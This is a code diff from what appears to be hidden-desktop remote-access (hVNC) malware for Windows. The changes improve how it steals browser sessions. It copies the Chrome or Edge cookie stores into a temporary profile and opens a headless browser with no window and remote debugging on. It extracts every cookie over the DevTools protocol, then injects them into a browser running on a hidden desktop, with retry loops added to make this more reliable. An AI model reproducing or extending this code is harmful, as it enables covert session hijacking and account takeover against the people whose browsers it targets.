@@ -1288,27 +1288,23 @@ static wstring get_browser_path(const wstring& browser_exe) {
 static json get_cookies_cdp(int port) {
     CDPClient http;
     if (!http.connect("127.0.0.1", port)) return json::array();
-
-    string list = http.request("/json/list");
+    string version_info = http.request("/json/version");
     http.close();
 
     try {
-        json pages = json::parse(list);
-        if (pages.is_array() && !pages.empty()) {
-            string ws_url = pages[0]["webSocketDebuggerUrl"];
-            size_t path_start = ws_url.find("/devtools/page/");
-            if (path_start == string::npos) return json::array();
-            string path = ws_url.substr(path_start);
+        json info = json::parse(version_info);
+        string ws_url = info["webSocketDebuggerUrl"];
+        size_t path_start = ws_url.find("/devtools/browser/");
+        if (path_start == string::npos) return json::array();
+        string path = ws_url.substr(path_start);
 
-            WSClient ws;
-            if (ws.connect("127.0.0.1", port, path)) {
-                json cmd = { {"id", 1}, {"method", "Network.getAllCookies"}, {"params", json::object()} };
-                ws.send_frame(cmd.dump());
-
-                string res_str = ws.recv_frame();
-                ws.close();
-
-                json res = json::parse(res_str);
+        WSClient ws;
+        if (ws.connect("127.0.0.1", port, path)) {
+            ws.send_frame(json({ {"id", 1}, {"method", "Network.getAllCookies"}, {"params", json::object()} }).dump());
+            string res_str = ws.recv_frame();
+            ws.close();
+            json res = json::parse(res_str);
+            if (res.contains("result") && res["result"].contains("cookies")) {
                 return res["result"]["cookies"];
             }
         }
@@ -1317,41 +1313,34 @@ static json get_cookies_cdp(int port) {
 }
 
 static void set_cookies_cdp(int port, const json& cookies) {
+    if (cookies.empty()) return;
     CDPClient http;
     if (!http.connect("127.0.0.1", port)) return;
-
-    string list = http.request("/json/list");
+    string version_info = http.request("/json/version");
     http.close();
 
     try {
-        json pages = json::parse(list);
-        if (pages.is_array() && !pages.empty()) {
-            string ws_url = pages[0]["webSocketDebuggerUrl"];
-            size_t path_start = ws_url.find("/devtools/page/");
-            if (path_start == string::npos) return;
-            string path = ws_url.substr(path_start);
+        json info = json::parse(version_info);
+        string ws_url = info["webSocketDebuggerUrl"];
+        size_t path_start = ws_url.find("/devtools/browser/");
+        if (path_start == string::npos) return;
+        string path = ws_url.substr(path_start);
 
-            WSClient ws;
-            if (ws.connect("127.0.0.1", port, path)) {
-                ws.send_frame(json({ {"id", 2}, {"method", "Network.enable"}, {"params", json::object()} }).dump());
-                ws.recv_frame();
-
-                for (const auto& cookie : cookies) {
-                    json params = {
-                        {"name", cookie["name"]},
-                        {"value", cookie["value"]},
-                        {"domain", cookie["domain"]},
-                        {"path", cookie["path"]},
-                        {"secure", cookie["secure"]},
-                        {"httpOnly", cookie["httpOnly"]},
-                        {"sameSite", cookie.value("sameSite", "Lax")},
-                        {"expires", cookie.value("expires", 0.0)}
-                    };
-                    ws.send_frame(json({ {"id", 3}, {"method", "Network.setCookie"}, {"params", params} }).dump());
-                    ws.recv_frame();
-                }
-                ws.close();
+        WSClient ws;
+        if (ws.connect("127.0.0.1", port, path)) {
+            json params = { {"cookies", json::array()} };
+            for (const auto& c : cookies) {
+                json cookie = {
+                    {"name", c["name"]}, {"value", c["value"]}, {"domain", c["domain"]},
+                    {"path", c["path"]}, {"secure", c["secure"]}, {"httpOnly", c["httpOnly"]},
+                    {"sameSite", c.value("sameSite", "Lax")}
+                };
+                if (c.contains("expires")) cookie["expires"] = c["expires"];
+                params["cookies"].push_back(cookie);
             }
+            ws.send_frame(json({ {"id", 2}, {"method", "Network.setCookies"}, {"params", params} }).dump());
+            ws.recv_frame();
+            ws.close();
         }
     } catch (...) {}
 }
@@ -1388,18 +1377,26 @@ static void launch_browser_thread(wstring browser_name) {
     wchar_t localAppData[MAX_PATH];
     wstring source_path;
     if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) != 0) {
-        if (browser_name == L"chrome.exe") {
-            source_path = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
-        } else if (browser_name == L"msedge.exe") {
-            source_path = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
-        }
+        if (browser_name == L"chrome.exe") source_path = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
+        else if (browser_name == L"msedge.exe") source_path = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
     }
 
     int extract_port = 9222;
-    wstring extract_cmd = L"\"" + browser_path + L"\" --remote-debugging-port=" + to_wstring(extract_port) + L" --headless --disable-gpu";
+    wstring extract_cmd = L"\"" + browser_path + L"\" --remote-debugging-port=" + to_wstring(extract_port) + L" --headless --disable-gpu about:blank";
+
+    // Fallback: If original profile is locked, create a mini bridge profile
+    wstring bridge_dir = L"";
     if (!source_path.empty()) {
-        extract_cmd += L" --user-data-dir=\"" + source_path + L"\"";
+        wchar_t temp[MAX_PATH]; GetTempPathW(MAX_PATH, temp);
+        bridge_dir = wstring(temp) + L"hvnc_bridge_" + to_wstring(GetTickCount());
+        std::filesystem::create_directories(bridge_dir + L"\\Default\\Network");
+        CopyFileW((source_path + L"\\Local State").c_str(), (bridge_dir + L"\\Local State").c_str(), FALSE);
+        CopyFileW((source_path + L"\\Default\\Cookies").c_str(), (bridge_dir + L"\\Default\\Cookies").c_str(), FALSE);
+        CopyFileW((source_path + L"\\Default\\Network\\Cookies").c_str(), (bridge_dir + L"\\Default\\Network\\Cookies").c_str(), FALSE);
+        CopyFileW((source_path + L"\\Default\\Preferences").c_str(), (bridge_dir + L"\\Default\\Preferences").c_str(), FALSE);
+        extract_cmd += L" --user-data-dir=\"" + bridge_dir + L"\"";
     }
+
     vector<wchar_t> exCmdVec(extract_cmd.begin(), extract_cmd.end());
     exCmdVec.push_back(L'\0');
 
@@ -1407,12 +1404,16 @@ static void launch_browser_thread(wstring browser_name) {
     PROCESS_INFORMATION pi_ex = { 0 };
     json cookies = json::array();
     if (CreateProcessW(NULL, exCmdVec.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_ex, &pi_ex)) {
-        Sleep(3000); // Wait for Chrome to start
-        cookies = get_cookies_cdp(extract_port);
+        for (int i = 0; i < 10; i++) {
+            Sleep(1000);
+            cookies = get_cookies_cdp(extract_port);
+            if (!cookies.empty()) break;
+        }
         TerminateProcess(pi_ex.hProcess, 0);
         CloseHandle(pi_ex.hProcess);
         CloseHandle(pi_ex.hThread);
     }
+    if (!bridge_dir.empty()) std::filesystem::remove_all(bridge_dir);
 
     // 2. Prepare fresh profile for hidden desktop
     wstring target_data_dir;
@@ -1438,11 +1439,17 @@ static void launch_browser_thread(wstring browser_name) {
     PROCESS_INFORMATION pi = { 0 };
     if (CreateProcessW(NULL, cmdVec.data(), NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
-        Sleep(2000); // Wait for hidden browser to start
-
         // 4. Inject extracted cookies
         if (!cookies.empty()) {
-            set_cookies_cdp(hidden_port, cookies);
+            for (int i = 0; i < 15; i++) {
+                Sleep(1000);
+                CDPClient test;
+                if (test.connect("127.0.0.1", hidden_port)) {
+                    test.close();
+                    set_cookies_cdp(hidden_port, cookies);
+                    break;
+                }
+            }
         }
 
         CloseHandle(pi.hProcess);
